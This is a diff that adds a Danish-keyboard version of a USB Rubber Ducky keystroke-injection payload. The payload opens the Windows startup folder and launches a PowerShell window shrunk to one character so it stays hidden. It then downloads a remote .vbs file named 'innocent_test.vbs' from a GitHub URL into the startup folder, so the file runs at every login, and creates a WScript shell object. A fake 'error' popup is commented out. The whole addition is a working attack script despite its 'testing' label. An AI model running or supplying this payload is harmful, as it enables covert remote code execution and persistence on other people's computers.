@@ -20,3 +20,34 @@ REM DELAY 40
 ALT SPACE 
 DELAY 10
 STRING c
+
+
+DANISH VERSION \/
+
+REM Created by Frederik Amfelt for testing purpose
+DUCKY_LANG DA
+GUI r
+DELAY 50
+STRINGLN shell:startup
+DELAY 50
+ALT A
+DELAY 100
+STRINGLN POWERSHELL.exe 
+DELAY 200
+STRING [console]::WindowHeight=1
+DELAY 10
+ENTER
+DELAY 10
+STRING [console]::WindowWidth=1
+DELAY 10
+ENTER
+DELAY 50
+STRINGLN Invoke-WebRequest -Uri https://raw.githubusercontent.com/Fred-the-bot/payloads/main/innocent_test.vbs -OutFile .\innocent.vbs
+DELAY 200
+STRINGLN $wshell = New-Object -ComObject Wscript.Shell
+DELAY 50
+REM STRINGLN $Output = $wshell.Popup("An error occured, please restart your PC",10,"ALERT",16)
+DELAY 40
+ALT SPACE
+DELAY 10
+STRING l
